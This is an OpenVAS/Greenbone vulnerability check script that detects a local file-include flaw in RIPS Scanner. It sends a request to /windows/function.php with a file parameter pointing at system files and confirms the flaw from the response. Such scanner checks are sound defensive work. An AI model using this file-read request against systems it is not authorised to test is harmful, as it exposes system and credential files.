CPE = "cpe:/a:rips_scanner:rips";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103375" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Rips Scanner Local File Include Vulnerability" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-01-02 09:57:26 +0100 (Mon, 02 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_rips_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "rips/Installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://c0ntex.blogspot.com/2011/12/rip-rips.html" );
	script_tag( name: "summary", value: "Rips Scanner is prone to a local file-include vulnerability
  because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the computer, other attacks are
  also possible." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are
to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/windows/function.php?file=/" + files[file] + "&start=0&end=10";
	if(http_vuln_check( port: port, url: url, pattern: file, extra_check: make_list( "phps-t" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

